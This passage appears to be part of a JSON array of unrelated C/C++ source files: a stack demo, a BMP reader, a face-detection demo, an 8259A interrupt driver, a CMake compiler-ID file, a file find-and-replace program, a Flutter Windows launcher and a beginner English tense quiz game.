endl;\n\tcout << \"Stack-2 has \" << stack.GetLength(2) << \" elements:\" << endl;//------------\u8c03\u7528\u5171\u4eab\u6808\u6c42\u6808\u957f\u51fd\u6570\n\tstack.Traverse(2,Display);//------------\u8c03\u7528\u5171\u4eab\u6808\u904d\u5386\u51fd\u6570\n\tcout << endl;\n\n\tcout << \"The elements in stack-1 are out of the stack:\" << endl;\n\twhile(stack.GetLength(1))\n\t{\n\t\tstack.Pop(1,data);//------------\u8c03\u7528\u5171\u4eab\u6808\u51fa\u6808\u51fd\u6570\n\t\tcout << data << \"  \"; \n\t}\n\tcout << endl;\n\tcout << \"The elements in stack-2 are out of the stack:\" << endl;\n\twhile(stack.GetLength(2))\n\t{\n\t\tstack.Pop(2,data);//------------\u8c03\u7528\u5171\u4eab\u6808\u51fa\u6808\u51fd\u6570\n\t\tcout << data << \"  \"; \n\t}\n\tcout << endl;\n\n\tif(stack.IsEmpty(1) && stack.IsEmpty(2))//------------\u8c03\u7528\u5171\u4eab\u6808\u5224\u6808\u7a7a\u51fd\u6570\n\t\tcout << \"Stack is empty!\" << endl;\n\n\tsystem(\"pause\");\n\treturn 0;\n}",
    "\ufeff#include \"BMPFile.hpp\"\n\nBMPFile::BMPFile() : rowSize_(0)\n{\t\n}\n\nBMPFile::~BMPFile()\n{\n\t//cout << \"Destructor called\\n\";\n\tcloseBMP();\n}\n/**\n* \u041c\u0435\u0442\u043e\u0434 \"\u043e\u0442\u043a\u0440\u044b\u0442\u0438\u044f\" BMP \u0444\u0430\u0439\u043b\u0430\n* \u0421\u043e\u0445\u0440\u0430\u043d\u044f\u0435\u0442 \u0434\u0430\u043d\u043d\u044b\u0435 \u043a\u0430\u0440\u0442\u0438\u043d\u043a\u0438 \u0434\u043b\u044f \u0434\u0430\u043b\u044c\u043d\u0435\u0439\u0448\u0435\u0439 \u043e\u0442\u0440\u0438\u0441\u043e\u0432\u043a\u0438.\n*/\nvoid BMPFile::openBMP(const string& fileName)\n{\n\tfstream file(fileName, ios::in | ios::binary);\t\t   // \u044f\u0432\u043d\u043e \u0443\u043a\u0430\u0437\u044b\u0432\u0430\u0435\u043c, \u0447\u0442\u043e \u0445\u043e\u0442\u0438\u043c \"\u0447\u0438\u0442\u0430\u0442\u044c \u0444\u0430\u0439\u043b \u043a\u0430\u043a \u0431\u0438\u043d\u0430\u0440\u043d\u044b\u0439\"\n\n\tif (!file.is_open()){\n\t\tfile.close();\n\t\tthrow runtime_error(\"Can not open file!\");\n\t}\n\n\tfile.read(reinterpret_cast<char*>(&fileHeader), sizeof(fileHeader));    // \u043f\u043e \u0445\u043e\u0440\u043e\u0448\u0435\u043c\u0443 \u0437\u0430\u043c\u0435\u043d\u0438\u0442\u044c \u043d\u0430 char* \n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t    // \u0438\u043b\u0438 \u0432\u044b\u0447\u043b\u0435\u043d\u044f\u0442\u044c \u0434\u0430\u043d\u043d\u044b\u0435 \u0438\u0437 \u043f\u043e\u0442\u043e\u043a\u0430 \u043f\u043e \u043e\u0447\u0435\u0440\u0435\u0434\u043d\u043e\n\n\tif (fileHeader.bfType != 0x4D42){\t\t\t\t\t\t\t\t\t    // \u0441\u0442\u0430\u043d\u0434\u0430\u0440\u0442\u043d\u043e\u0435 \u043d\u0430\u0447\u0430\u043b\u043e \u0444\u0430\u0439\u043b\u0430 \u0434\u043b\u044f bitmap 42 4D\n\t\tthrow runtime_error(\"It s not BMP file!\");\n\t}\n\n\tfile.read(reinterpret_cast<char*>(&fileInfo), sizeof(fileInfo));\n\t/*\n\tcout << \"File size: \"\t << fileHeader.bfSize\t << endl;\n\tcout << \"Width: \"\t\t << fileInfo.biWidth\t << endl;\n\tcout << \"Height: \"\t\t << fileInfo.biHeight\t << endl;\n\tcout << \"Bit Per Metr: \" << fileInfo.biBitCount\t << endl;\n\tcout << \"Image size: \"\t << fileInfo.biSizeImage << endl;\n\tcout << \"Offset: \"\t\t << fileHeader.bfOffBits << endl;\n\n\t*/\n\t\n\tfile.seekg(fileHeader.bfOffBits, ios::beg);\t\t\t\t\t\t\t // \u043c\u0435\u043d\u044f\u0435\u0442 \u043f\u043e\u0437\u0438\u0446\u0438\u044e \u0432 \u043f\u043e\u0442\u043e\u043a\u0435 \n\trowSize_ = (fileInfo.biWidth * fileInfo.biBitCount + 31) / 32 * 4;   // \u043f\u043e\u0434\u0441\u0447\u0438\u0442\u044b\u0432\u0430\u0435\u043c \u0434\u043b\u0438\u043d\u0443 \u0441\u0442\u0440\u0430\u0439\u0434\u0430 (\u043e\u043a\u0440\u0443\u0433\u043b\u0435\u043d\u0438\u0435 \u0434\u043e 32 \u0431\u0438\u0442\u0430)\n\n\tdata.resize(rowSize_ * fileInfo.biHeight);\t\t\t\t\t\t\t // \u0432\u044b\u0434\u0435\u043b\u044f\u0435\u043c \u043f\u0430\u043c\u044f\u0442\u044c \u0434\u043b\u044f \u0434\u0430\u043d\u043d\u044b\u0445\n\n\tfile.read(reinterpret_cast<char*>(data.data()), data.size());\t\t // \u0437\u0430\u043f\u0438\u0441\u044b\u0432\u0430\u0435\u043c \u0434\u0430\u043d\u043d\u044b\u0435 \u0432 \u0431\u0443\u0444\u0435\u0440\n\n\tfile.close();\n}\n/**\n* \u041c\u0435\u0442\u043e\u0434 \u043e\u0442\u0440\u0438\u0441\u043e\u0432\u043a\u0438 BMP \u0444\u0430\u0439\u043b\u0430\n* \u0437\u0430 \u0438\u0441\u0445\u043e\u0434\u043d\u044b\u0435 \u0434\u0430\u043d\u043d\u044b\u0435 \u0431\u0435\u0440\u0435\u0442 \u0434\u0430\u043d\u043d\u044b\u0435 \u0438\u0437 \u0441\u0442\u0440\u0443\u043a\u0442\u0443\u0440 \u043a\u043b\u0430\u0441\u0441\u0430\n*/\n\nvoid BMPFile::displayBMP() const\n{\n\tfor (int i = fileInfo.biHeight - 1; i >= 0; --i)\n\t{\n\t\tfor (int x = 0; x < fileInfo.biWidth; ++x)\n\t\t{\n\t\t\tint pxlOffset = i * rowSize_ + x * (fileInfo.biBitCount / 8);\n\t\t\t\n\t\t\tuint8_t blue = data[pxlOffset];\n\t\t\tuint8_t green = data[pxlOffset + 1];\n\t\t\tuint8_t red = data[pxlOffset + 2];\n\n\t\t\tif (red == 0 && green == 0 && blue == 0)\n\t\t\t{\n\t\t\t\tcout << \"0\";\n\t\t\t}\n\t\t\telse if (red == 255 && green == 255 && blue == 255) {\n\t\t\t\tcout << \".\";\n\t\t\t}\n\t\t\telse {\n\t\t\t\tcout << \"?\";\n\t\t\t}\n\t\t}\n\t\tcout << endl;\n\t}\n}\n/**\n* \n*/\nvoid BMPFile::closeBMP()\n{\n}\n\nuint32_t BMPFile::getW() const\n{\n\treturn fileInfo.biWidth;\n}\n\nuint32_t BMPFile::getH() const\n{\n\treturn fileInfo.biHeight;\n}\n\nuint32_t BMPFile::getOff() const\n{\n\treturn fileHeader.bfOffBits;\n}\n\n",
    "#include \"main.h\"\n\n\n\nFaceSDKConfig getConfig(int w, int h)\n{\n    FaceSDKConfig config;\n    config.img_w = w;\n    config.img_h = h;\n    config.screen_w = w;\n    config.screen_h = h;\n    config.input_format = ImageFormat::BGR;\n    config.mode = FaceSDKMode::Normal;\n    config.thread_num = 2;\n    return config;\n}\nParams params;\n\nint main(int argc, char* argv[]) {\n\tfloat eye_close_v = 0.5f;\n\tcmdline::parser p;\n\tp.add<std::string>(\"input_image\", 'i', \"Enter image path\", false, \"./demo/images/test2.jpg\");\n\tp.add<std::string>(\"output_image\", 'o', \"Enter image path\", false, \".\");\n\tp.add<std::string>(\"segment_model\", 's', \"segment model name\", false, \"mnn_hivision_modnet.mnn\");\n\tp.add<int>(\"out_size_kb\", 'k', \"image size\", false, 0);\n\tp.add<int>(\"thread_num\", 't', \"model use thread num\", false, 4);\n\tp.add<int>(\"background_color_r\", 'r', \"background red\", false, 255);\n\tp.add<int>(\"background_color_g\", 'g', \"background green\", false, 0);\n\tp.add<int>(\"background_color_b\", 'b', \"background blue\", false, 0);\n\tp.add<int>(\"out_images_width\", 'w', \"out images width\", false, 295);\n\tp.add<int>(\"out_images_height\", 'h', \"out images height\", false, 413);\n\tp.add<int>(\"face_model\", 'f', \"face_model type 5 and 8\", false, 8);\n\tstd::string face_model_path = \"./model\";\n\t//const char* segment_modnet = \"./model/mnn_hivision_modnet.mnn\";\n\tp.parse_check(argc, argv);\n\n\tparams.out_image_width=p.get<int>(\"out_images_width\");\n\tparams.out_image_height=p.get<int>(\"out_images_height\");\n\tparams.rgb_b=p.get<int>(\"background_color_b\");\n\tparams.rgb_g=p.get<int>(\"background_color_g\");\n\tparams.rgb_r=p.get<int>(\"background_color_r\");\n\n\tstd::string modelFilename = p.get<std::string>(\"segment_model\");\n\tstd::string modelPath = \"./model/\" + modelFilename;\n\tconst char* modelPathCStr = modelPath.c_str();\n\tcv::Vec3b newBackgroundColor(p.get<int>(\"background_color_b\"), p.get<int>(\"background_color_g\"), p.get<int>(\"background_color_r\"));\n\t// LFFD* face_detector = new LFFD(face_model_path, p.get<int>(\"face_model\"), p.get<int>(\"thread_num\"));\n\n\tcv::Mat image = cv::imread(p.get<std::string>(\"input_image\"), cv::IMREAD_COLOR);\n\tcv::Mat bgra_img=\tInterference(modelPathCStr, image,4);\n\n\tcv::Mat add_background_img = addBackground(bgra_img, newBackgroundColor);\n\tcv::cvtColor(add_background_img, add_background_img, cv::COLOR_BGRA2BGR);\n\tint w = add_background_img.cols;\n    int h = add_background_img.rows;\n\tFaceSDKConfig config = getConfig(w, h);\n\tfacesdk_init(config);\n\tchar data[w * h * 3];\n    memcpy(data, (char *)add_background_img.data, w * h * 3);\n    facesdk_readModelFromFile(ModelType::Detect, \"./model/face_detect.bin\", ImageFormat::RGB);\n    sdkFaces faces = facesdk_detect(data);\n\t std::cout << \"faces:\" << faces.face_count << std::endl;\n    for (int i = 0; i < faces.face_count; i++)\n    {\n        cv::Point pt1(faces.info[i].face_box.x1, faces.info[i].face_box.y1);\n        cv::Point pt2(faces.info[i].face_box.x2, faces.info[i].face_box.y2);\n        cv::rectangle(add_background_img, pt1, pt2, cv::Scalar(255, 0, 0), 2);\n    }\n\t    facesdk_readModelFromFile(ModelType::Landmark, \"./model/yolov5s.bin\", ImageFormat::RGB);\n    sdkFaces faces2 = facesdk_landmark();\n    int index = 0;\n    for (int j = 0; j < faces2.face_count; j++)\n    {\n        index++;\n        for (int i = 0; i < 424; i = i + 2)\n        {\n            cv::Point pt(faces2.info[j].landmarks[i], faces2.info[j].landmarks[i + 1]);\n            cv::circle(add_background_img, pt, 1, cv::Scalar(255, 0, 0), 1);\n        }\n        std::cout << std::endl;\n\n        if (faces2.info[j].lefteye_close_state < eye_close_v)\n        {\n            std::cout << \"\u5de6\u773c\u5f00\" << std::endl;\n            cv::putText(add_background_img, \"left eye open\",\n                        cv::Point(10, 20 + index * 30), cv::FONT_HERSHEY_DUPLEX, 1, cv::Scalar(0, 255, 255), 2);\n        }\n        else\n        {\n            std::cout << \"\u5de6\u773c\u5173\" << std::endl;\n            cv::putText(add_background_img, \"left eye close\",\n                        cv::Point(10, 20 + index * 30), cv::FONT_HERSHEY_DUPLEX, 1, cv::Scalar(0, 255, 255), 2);\n        }\n\n        if (faces2.info[j].righteye_close_state < eye_close_v)\n        {\n            std::cout << \"\u53f3\u773c\u5f00\" << std::endl;\n            cv::putText(add_background_img, \"right eye open\",\n                        cv::Point(10, 50 + index * 30), cv::FONT_HERSHEY_DUPLEX, 1, cv::Scalar(0, 255, 255), 2);\n        }\n        else\n        {\n            std::cout << \"\u53f3\u773c\u5173\" << std::endl;\n            cv::putText(add_background_img, \"right eye close\",\n                        cv::Point(10, 50 + index * 30), cv::FONT_HERSHEY_DUPLEX, 1, cv::Scalar(0, 255, 255), 2);\n        }\n        std::cout << std::endl;\n    }\n\tfacesdk_readModelFromFile(ModelType::Attribution, \"./model/face_attr.bin\", ImageFormat::RGB);\n    sdkFaces faces3 = facesdk_attribute();\n    std::cout << faces3.face_count << std::endl;\n    for (int i = 0; i < faces3.face_count; i++)\n    {\n        std::cout << \"age: \" << faces3.info[i].attribution.age << std::endl;\n        std::cout << \"",
    "#include \"Arch/x86_64/interrupt/8259a.hpp\"\n#include <Arch/x86_64/platform/platform.hpp>\nPUBLIC namespace QuantumNEC::Architecture {\n    PIC8259A::PIC8259A( VOID ) noexcept {\n        this->enable_8259A_pic( );\n        // \u65f6\u95f4\u4e2d\u65ad\uff0c\u952e\u76d8\u4e2d\u65ad\n        CPUs::io_out8( PIC_M_DATA, 0xfc );\n        CPUs::io_out8( PIC_S_DATA, 0xff );\n    }\n    PIC8259A::~PIC8259A( VOID ) noexcept {\n    }\n    auto PIC8259A::eoi( IN CONST irq_t irq )->VOID {\n        if ( irq >= 0x28 ) {\n            CPUs::io_out8( PIC_S_CTRL, PIC_EOI );\n        }\n        CPUs::io_out8( PIC_M_CTRL, PIC_EOI );\n        return;\n    }\n    auto PIC8259A::disable_8259A_pic( VOID )->VOID {\n        CPUs::io_out8( PIC_M_DATA, 0xff );\n        CPUs::io_out8( PIC_S_DATA, 0xff );\n    }\n    auto PIC8259A::enable_8259A_pic( VOID )->VOID {\n        CPUs::io_out8( PIC_M_CTRL, 0x11 ); /* \u8fb9\u6cbf\u89e6\u53d1\u6a21\u5f0f */\n        CPUs::io_out8( PIC_M_DATA, 0x20 ); /* IRQ0-7\u7531INT20-27\u63a5\u6536 */\n        CPUs::io_out8( PIC_M_DATA, 0x04 ); /* PIC1\u7531IRQ2\u8fde\u63a5*/\n        CPUs::io_out8( PIC_M_DATA, 0x01 ); /* \u65e0\u7f13\u51b2\u533a\u6a21\u5f0f */\n        CPUs::io_out8( PIC_S_CTRL, 0x11 ); /* \u4e0e\u4e0a\u65b9\u7c7b\u4f3c */\n        CPUs::io_out8( PIC_S_DATA, 0x28 ); /* IRQ8-15 INT28-2f */\n        CPUs::io_out8( PIC_S_DATA, 0x02 ); /* PIC1 IRQ2 */\n        CPUs::io_out8( PIC_S_DATA, 0x01 ); /* \u65e0\u7f13\u51b2\u533a\u6a21\u5f0f */\n    }\n    auto PIC8259A::irq_set_mask( IN irq_t irq )->VOID {\n        Lib::Types::uint16_t port { };\n        if ( irq < 8 ) {\n            port = PIC_M_DATA;\n        }\n        else {\n            port = PIC_S_DATA;\n            irq -= 8;\n        }\n        CPUs::io_out8( port, CPUs::io_in8( port ) | ( 1 << irq ) );\n    }\n    auto PIC8259A::irq_clear_mask( IN irq_t irq )->VOID {\n        Lib::Types::uint16_t port { };\n        if ( irq < 8 ) {\n            port = PIC_M_DATA;\n        }\n        else {\n            port = PIC_S_DATA;\n            irq -= 8;\n        }\n        CPUs::io_out8( port, CPUs::io_in8( port ) & ~( 1 << irq ) );\n    }\n    auto PIC8259A::get_irq_reg( IN Lib::Types::int32_t ocw3 )->Lib::Types::uint16_t {\n        CPUs::io_out8( PIC_M_COMMAND, ocw3 );\n        CPUs::io_out8( PIC_S_COMMAND, ocw3 );\n        return ( CPUs::io_in8( PIC_S_COMMAND ) << 8 ) | CPUs::io_in8( PIC_M_COMMAND );\n    }\n    auto PIC8259A::get_irr( void )->Lib::Types::uint16_t {\n        return get_irq_reg( PIC_READ_IRR );\n    }\n    auto PIC8259A::get_isr( void )->Lib::Types::uint16_t {\n        return get_irq_reg( PIC_READ_ISR );\n    }\n}",
    "/* This source file must have a .cpp extension so that all C++ compilers\n   recognize the extension without flags.  Borland does not know .cxx for\n   example.  */\n#ifndef __cplusplus\n# error \"A C compiler has been selected for C++.\"\n#endif\n\n#if !defined(__has_include)\n/* If the compiler does not have __has_include, pretend the answer is\n   always no.  */\n#  define __has_include(x) 0\n#endif\n\n\n/* Version number components: V=Version, R=Revision, P=Patch\n   Version date components:   YYYY=Year, MM=Month,   DD=Day  */\n\n#if defined(__INTEL_COMPILER) || defined(__ICC)\n# define COMPILER_ID \"Intel\"\n# if defined(_MSC_VER)\n#  define SIMULATE_ID \"MSVC\"\n# endif\n# if defined(__GNUC__)\n#  define SIMULATE_ID \"GNU\"\n# endif\n  /* __INTEL_COMPILER = VRP prior to 2021, and then VVVV for 2021 and later,\n     except that a few beta releases use the old format with V=2021.  */\n# if __INTEL_COMPILER < 2021 || __INTEL_COMPILER == 202110 || __INTEL_COMPILER == 202111\n#  define COMPILER_VERSION_MAJOR DEC(__INTEL_COMPILER/100)\n#  define COMPILER_VERSION_MINOR DEC(__INTEL_COMPILER/10 % 10)\n#  if defined(__INTEL_COMPILER_UPDATE)\n#   define COMPILER_VERSION_PATCH DEC(__INTEL_COMPILER_UPDATE)\n#  else\n#   define COMPILER_VERSION_PATCH DEC(__INTEL_COMPILER   % 10)\n#  endif\n# else\n#  define COMPILER_VERSION_MAJOR DEC(__INTEL_COMPILER)\n#  define COMPILER_VERSION_MINOR DEC(__INTEL_COMPILER_UPDATE)\n   /* The third version component from --version is an update index,\n      but no macro is provided for it.  */\n#  define COMPILER_VERSION_PATCH DEC(0)\n# endif\n# if defined(__INTEL_COMPILER_BUILD_DATE)\n   /* __INTEL_COMPILER_BUILD_DATE = YYYYMMDD */\n#  define COMPILER_VERSION_TWEAK DEC(__INTEL_COMPILER_BUILD_DATE)\n# endif\n# if defined(_MSC_VER)\n   /* _MSC_VER = VVRR */\n#  define SIMULATE_VERSION_MAJOR DEC(_MSC_VER / 100)\n#  define SIMULATE_VERSION_MINOR DEC(_MSC_VER % 100)\n# endif\n# if defined(__GNUC__)\n#  define SIMULATE_VERSION_MAJOR DEC(__GNUC__)\n# elif defined(__GNUG__)\n#  define SIMULATE_VERSION_MAJOR DEC(__GNUG__)\n# endif\n# if defined(__GNUC_MINOR__)\n#  define SIMULATE_VERSION_MINOR DEC(__GNUC_MINOR__)\n# endif\n# if defined(__GNUC_PATCHLEVEL__)\n#  define SIMULATE_VERSION_PATCH DEC(__GNUC_PATCHLEVEL__)\n# endif\n\n#elif (defined(__clang__) && defined(__INTEL_CLANG_COMPILER)) || defined(__INTEL_LLVM_COMPILER)\n# define COMPILER_ID \"IntelLLVM\"\n#if defined(_MSC_VER)\n# define SIMULATE_ID \"MSVC\"\n#endif\n#if defined(__GNUC__)\n# define SIMULATE_ID \"GNU\"\n#endif\n/* __INTEL_LLVM_COMPILER = VVVVRP prior to 2021.2.0, VVVVRRPP for 2021.2.0 and\n * later.  Look for 6 digit vs. 8 digit version number to decide encoding.\n * VVVV is no smaller than the current year when a version is released.\n */\n#if __INTEL_LLVM_COMPILER < 1000000L\n# define COMPILER_VERSION_MAJOR DEC(__INTEL_LLVM_COMPILER/100)\n# define COMPILER_VERSION_MINOR DEC(__INTEL_LLVM_COMPILER/10 % 10)\n# define COMPILER_VERSION_PATCH DEC(__INTEL_LLVM_COMPILER    % 10)\n#else\n# define COMPILER_VERSION_MAJOR DEC(__INTEL_LLVM_COMPILER/10000)\n# define COMPILER_VERSION_MINOR DEC(__INTEL_LLVM_COMPILER/100 % 100)\n# define COMPILER_VERSION_PATCH DEC(__INTEL_LLVM_COMPILER     % 100)\n#endif\n#if defined(_MSC_VER)\n  /* _MSC_VER = VVRR */\n# define SIMULATE_VERSION_MAJOR DEC(_MSC_VER / 100)\n# define SIMULATE_VERSION_MINOR DEC(_MSC_VER % 100)\n#endif\n#if defined(__GNUC__)\n# define SIMULATE_VERSION_MAJOR DEC(__GNUC__)\n#elif defined(__GNUG__)\n# define SIMULATE_VERSION_MAJOR DEC(__GNUG__)\n#endif\n#if defined(__GNUC_MINOR__)\n# define SIMULATE_VERSION_MINOR DEC(__GNUC_MINOR__)\n#endif\n#if defined(__GNUC_PATCHLEVEL__)\n# define SIMULATE_VERSION_PATCH DEC(__GNUC_PATCHLEVEL__)\n#endif\n\n#elif defined(__PATHCC__)\n# define COMPILER_ID \"PathScale\"\n# define COMPILER_VERSION_MAJOR DEC(__PATHCC__)\n# define COMPILER_VERSION_MINOR DEC(__PATHCC_MINOR__)\n# if defined(__PATHCC_PATCHLEVEL__)\n#  define COMPILER_VERSION_PATCH DEC(__PATHCC_PATCHLEVEL__)\n# endif\n\n#elif defined(__BORLANDC__) && defined(__CODEGEARC_VERSION__)\n# define COMPILER_ID \"Embarcadero\"\n# define COMPILER_VERSION_MAJOR HEX(__CODEGEARC_VERSION__>>24 & 0x00FF)\n# define COMPILER_VERSION_MINOR HEX(__CODEGEARC_VERSION__>>16 & 0x00FF)\n# define COMPILER_VERSION_PATCH DEC(__CODEGEARC_VERSION__     & 0xFFFF)\n\n#elif defined(__BORLANDC__)\n# define COMPILER_ID \"Borland\"\n  /* __BORLANDC__ = 0xVRR */\n# define COMPILER_VERSION_MAJOR HEX(__BORLANDC__>>8)\n# define COMPILER_VERSION_MINOR HEX(__BORLANDC__ & 0xFF)\n\n#elif defined(__WATCOMC__) && __WATCOMC__ < 1200\n# define COMPILER_ID \"Watcom\"\n   /* __WATCOMC__ = VVRR */\n# define COMPILER_VERSION_MAJOR DEC(__WATCOMC__ / 100)\n# define COMPILER_VERSION_MINOR DEC((__WATCOMC__ / 10) % 10)\n# if (__WATCOMC__ % 10) > 0\n#  define COMPILER_VERSION_PATCH DEC(__WATCOMC__ % 10)\n# endif\n\n#elif defined(__WATCOMC__)\n# define COMPILER_ID \"OpenWatcom\"\n   /* __WATCOMC__ = VVRP + 1100 */\n# define COMPILER_VERSION_MAJOR DEC((__WATCOMC__ - 1100) / 100)\n# define COMPILER_VERSION_MINOR DEC((__WATCOMC__ / 10) % 10)\n# if (__WATCOMC__ % 10) > 0\n#  define COMPILER_VERSION_PATCH DEC(",
    "#include <iostream>   // Including the input/output stream library\r\n#include <fstream>    // Including the file stream library\r\n#include <string>     // Including the string handling library\r\n\r\n// Function to display the content of a file\r\nvoid displayFileContent(const std::string & filename) {\r\n  std::ifstream file(filename); // Open file with given filename\r\n  std::string line; // Declare a string to store each line of text\r\n\r\n  if (file.is_open()) { // Check if the file was successfully opened\r\n    std::cout << \"File content:\" << std::endl; // Displaying a message indicating file content\r\n    while (std::getline(file, line)) { // Read each line from the file\r\n      std::cout << line << std::endl; // Display each line of the file\r\n    }\r\n    file.close(); // Close the file\r\n  } else {\r\n    std::cout << \"Failed to open the file.\" << std::endl; // Display an error message if file opening failed\r\n  }\r\n}\r\n\r\nint main() {\r\n  std::ifstream inputFile(\"test.txt\"); // Open the input file named \"test.txt\" for reading\r\n  std::ofstream outputFile(\"new_test.txt\"); // Create or overwrite the output file named \"new_test.txt\" for writing\r\n\r\n  if (inputFile.is_open() && outputFile.is_open()) { // Check if both input and output files were successfully opened\r\n    std::string line; // Declare a string variable to store each line of text\r\n    std::string searchWord = \"C++\"; // Define the word to search for\r\n    std::string replaceWord = \"CPP\"; // Define the word to replace with\r\n\r\n    std::cout << \"Search word:\" << searchWord << std::endl; // Display the word to search for\r\n    std::cout << \"Replace word:\" << replaceWord << std::endl; // Display the word to replace with\r\n\r\n    std::cout << \"\\nBefore find and replace:\" << std::endl; // Display a message before find and replace\r\n    displayFileContent(\"test.txt\"); // Display the content of the input file before find and replace\r\n\r\n    while (std::getline(inputFile, line)) { // Loop through each line in the input file\r\n      size_t pos = line.find(searchWord); // Find the position of the search word in the line\r\n\r\n      while (pos != std::string::npos) { // Repeat until all occurrences are replaced\r\n        line.replace(pos, searchWord.length(), replaceWord); // Replace the search word with the replace word\r\n        pos = line.find(searchWord, pos + replaceWord.length()); // Find the next occurrence of the search word\r\n      }\r\n      outputFile << line << \"\\n\"; // Write the modified line to the output file\r\n    }\r\n\r\n    inputFile.close(); // Close the input file\r\n    outputFile.close(); // Close the output file\r\n\r\n    std::cout << \"After find and replace:\" << std::endl; // Display a message after find and replace\r\n    displayFileContent(\"new_test.txt\"); // Display the content of the output file after find and replace\r\n\r\n    std::cout << \"\\nWord replaced successfully.\" << std::endl; // Display a success message\r\n  } else {\r\n    std::cout << \"\\nFailed to open the files.\" << std::endl; // Display an error message if file opening failed\r\n  }\r\n\r\n  return 0; // Return 0 to indicate successful execution\r\n}\r\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"pesona_babakan_madang\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <iostream>\n#include <ctime>\n#include <string>\n#include <limits> // \u0e2a\u0e33\u0e2b\u0e23\u0e31\u0e1a\u0e43\u0e0a\u0e49 numeric_limits\nusing namespace std;\n\nconst int MAX_SCORES = 10; // \u0e08\u0e33\u0e19\u0e27\u0e19\u0e2a\u0e39\u0e07\u0e2a\u0e38\u0e14\u0e02\u0e2d\u0e07\u0e04\u0e30\u0e41\u0e19\u0e19\u0e17\u0e35\u0e48\u0e40\u0e01\u0e47\u0e1a\nstring players[MAX_SCORES]; // \u0e40\u0e01\u0e47\u0e1a\u0e0a\u0e37\u0e48\u0e2d\u0e1c\u0e39\u0e49\u0e40\u0e25\u0e48\u0e19\nint highScores[MAX_SCORES] = {0}; // \u0e40\u0e01\u0e47\u0e1a\u0e04\u0e30\u0e41\u0e19\u0e19\u0e2a\u0e39\u0e07\u0e2a\u0e38\u0e14\ndouble times[MAX_SCORES] = {0}; // \u0e40\u0e01\u0e47\u0e1a\u0e40\u0e27\u0e25\u0e32\u0e17\u0e35\u0e48\u0e43\u0e0a\u0e49\u0e40\u0e25\u0e48\u0e19\nint totalScores = 0; // \u0e08\u0e33\u0e19\u0e27\u0e19\u0e02\u0e2d\u0e07\u0e04\u0e30\u0e41\u0e19\u0e19\u0e17\u0e35\u0e48\u0e16\u0e39\u0e01\u0e40\u0e01\u0e47\u0e1a\n\nvoid displayMenu() {\n    \n    cout << \"\\n--- English Tense Game ---\\n\";\n    cout << \"1. Present Simple\\n\";\n    cout << \"2. Past Simple\\n\";\n    cout << \"3. Future Simple\\n\";\n    cout << \"4. Show score board\\n\";\n    cout << \"5. Exit\\n\";\n}\n\nint playGame(int choice) {\n    int score = 0;\n    if (choice == 1) {\n        // Present Simple questions\n        cout << \"1) What is the correct form of the verb in 'He _ every day.\" << endl;\n        cout << \"please enter number to select answer:       1.runs        2.run      3.ran\" << endl;\n        string answer;\n        cin >> answer;\n        if (answer == \"1\" || \"runs\") score++;\n        \n        cout << \"2) Fill in the blank: He ___ (play) football every day.\\n\";\n        string textAnswer;\n        cin >> textAnswer;\n        if (textAnswer == \"plays\") score++;\n    }\n    else if (choice == 2) {\n        // Past Simple questions\n        cout << \"1) What is the past form of 'go'?\\n1. goes\\n2. went\\n3. gone\\n\";\n        int answer;\n        cin >> answer;\n        if (answer == 2) score++;\n        \n        cout << \"2) Fill in the blank: He ___ (go) to the park yesterday.\\n\";\n        string textAnswer;\n        cin >> textAnswer;\n        if (textAnswer == \"went\") score++;\n    }\n    else if (choice == 3) {\n        // Future Simple questions\n        cout << \"1) Which one is Future Simple?\\n1. will go\\n2. goes\\n3. went\\n\";\n        int answer;\n        cin >> answer;\n        if (answer == 1) score++;\n        \n        cout << \"2) Fill in the blank: He ___ (go) to the park tomorrow.\\n\";\n        string textAnswer;\n        cin >> textAnswer;\n        if (textAnswer == \"will go\") score++;\n    }\n    return score;\n}\n\nvoid updateHighScores(string playerName, int score, double timeTaken) {\n    if (totalScores < MAX_SCORES) {\n        players[totalScores] = playerName;\n        highScores[totalScores] = score;\n        times[totalScores] = timeTaken;\n        totalScores++;\n    } else {\n        // Replace lowest score if current score is better\n        int minIndex = 0;\n        for (int i = 1; i < MAX_SCORES; i++) {\n            if (highScores[i] < highScores[minIndex]) {\n                minIndex = i;\n            }\n        }\n        if (score > highScores[minIndex]) {\n            players[minIndex] = playerName;\n            highScores[minIndex] = score;\n            times[minIndex] = timeTaken;\n        }\n    }\n}\n\nvoid sortScores() {\n    for (int i = 0; i < totalScores - 1; i++) {\n        for (int j = 0; j < totalScores - i - 1; j++) {\n            if (highScores[j] < highScores[j + 1]) {\n                // Swap scores\n                swap(highScores[j], highScores[j + 1]);\n                // Swap names\n                swap(players[j], players[j + 1]);\n                // Swap times\n                swap(times[j], times[j + 1]);\n            }\n        }\n    }\n}\n\nvoid displayHighScores() {\n    cout << \"\\n--- High Scores ---\\n\";\n    \n    // \u0e40\u0e23\u0e35\u0e22\u0e07\u0e25\u0e33\u0e14\u0e31\u0e1a\u0e04\u0e30\u0e41\u0e19\u0e19\u0e08\u0e32\u0e01\u0e2a\u0e39\u0e07\u0e44\u0e1b\u0e15\u0e48\u0e33\u0e01\u0e48\u0e2d\u0e19\u0e41\u0e2a\u0e14\u0e07\u0e1c\u0e25\n    sortScores();\n    \n    for (int i = 0; i < totalScores; i++) {\n        cout << i + 1 << \". \" << players[i] << \" - Score: \" << 